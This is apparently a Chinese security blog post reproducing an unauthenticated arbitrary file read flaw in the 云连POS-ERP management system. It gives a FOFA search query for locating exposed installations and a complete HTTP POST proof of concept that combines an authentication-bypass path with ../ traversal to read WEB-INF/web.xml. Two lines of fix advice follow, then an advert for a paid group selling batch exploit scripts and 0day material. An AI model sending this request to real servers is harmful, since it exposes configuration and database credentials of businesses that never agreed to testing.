#  「漏洞复现」云连POS-ERP管理系统 download.action 任意文件读取漏洞   
冷漠安全  冷漠安全   2024-12-22 02:58  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0pFeDPJNnYaE7pYibBLQrUbLZwqelcotCqhYf0seBKfHroSUm8XuHyka5I3SmicWcJYUpZbFmxJCZ1Q/640?wx_fmt=gif&from=appmsg "")  
  
0x01 免责声明  
  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任。工具来自网络，安全性自测，如有侵权请联系删除。本次测试仅供学习使用，如若非法他用，与平台和本文作者无关，需自行负责！！！  
  
0x02  
  
产品介绍  
  
云连POS-ERP管理系统作为一种综合的管理软件，旨在为企业提供全面、高效的业务管理解决方案。基于云计算技术，集POS收银与ERP管理功能于一体的综合管理系统。它通过网络对企业的各类信息进行集中、统一和实时的管理，帮助企业实现销售、库存、财务等业务的全面数字化管理。系统具有用户友好的操作界面和简单直观的操作流程，使得用户可以快速上手并熟练使用。同时，系统还提供了多种数据导出方式，方便用户实时导出各类报表、销售数据、库存数据等，极大地提高了工作效率。  
  
0x03  
  
漏洞威胁  
  
云连POS-ERP管理系统 download.action 存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
  
0x04  
  
漏洞环境  
  
FOFA:  
   
```
title="Powered By chaosZ"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oZcNZfBCQWrP69Hy1XlzotDxSMHhaHYJ6MfZyBJBibwF0K5OfMSibVVXIxX3X6og1CPFQ0eibBgelhw/640?wx_fmt=png&from=appmsg "")  
  
  
0x05  
  
漏洞复现  
  
PoC  
```
POST /admin/file!download.action;admin!login.action HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Connection: close

downloadFile=../../WEB-INF/web.xml
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oZcNZfBCQWrP69Hy1Xlzot4CrZwwMmS2icowVibzovFPTe9z3UEliagwsiag1xiaO8ebT1LreEpTMiaAZw/640?wx_fmt=png&from=appmsg "")  
  
0x06  
  
批量脚本验证  
  
Nuclei验证脚本已发布  
  
知识星球：冷漠安全  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oZcNZfBCQWrP69Hy1XlzotmrQMxSV7ooXicTEh3jOXkwDZX47NbjZKCMyTUo6JTMHJHe6FL0xuXHQ/640?wx_fmt=png&from=appmsg "")  
  
  
0x07  
  
修复建议  
  
关闭互联网暴露面或接口设置访问权限  
  
升级至安全版本或打补丁  
  
0x08  
  
加入我们  
  
漏洞详情及批量检测POC工具请前往知识星球获取  
  
知识星球：冷漠安全  
  
交个朋友，限时优惠券：加入立减25  
  
星球福利：每天更新最新漏洞POC、资料文献、内部工具等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/rPMtsalfZ0oZcNZfBCQWrP69Hy1XlzotqBaTg2ohJdicicw4Dniakh5Z6kr2nzZKwvOJhalGqSJW4ibcqVBugGlNAw/640?wx_fmt=png&from=appmsg "")  
  
  
「星球介绍」：  
  
本星球不割韭菜，不发烂大街东西。欢迎进来白嫖，不满意三天退款。  
  
本星球坚持每天分享一些攻防知识，包括攻防技术、网络安全漏洞预警脚本、网络安全渗透测试工具、解决方案、安全运营、安全体系、安全培训和安全标准等文库。  
  
本星主已加入几十余个付费星球，定期汇聚高质量资料及工具进行星球分享。  
  
  
「星球服务」：  
  
  
加入星球，你会获得：  
  
  
♦ 批量验证漏洞POC脚本  
  
  
♦ 0day、1day分享  
  
  
♦ 汇集其它付费星球资源分享  
  
  
♦ 大量的红蓝对抗实战资源  
  
  
♦ 优秀的内部红蓝工具及插件  
  
  
♦ 综合类别优秀Wiki文库及漏洞库  
  
  
♦ 提问及技术交流  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/rPMtsalfZ0oZcNZfBCQWrP69Hy1XlzotxCMibxib4YRMb7Ym0INeZweXBorwI1A94OviacatqCOB2fpsIspd8CD8w/640?wx_fmt=gif&from=appmsg "")  
  
  
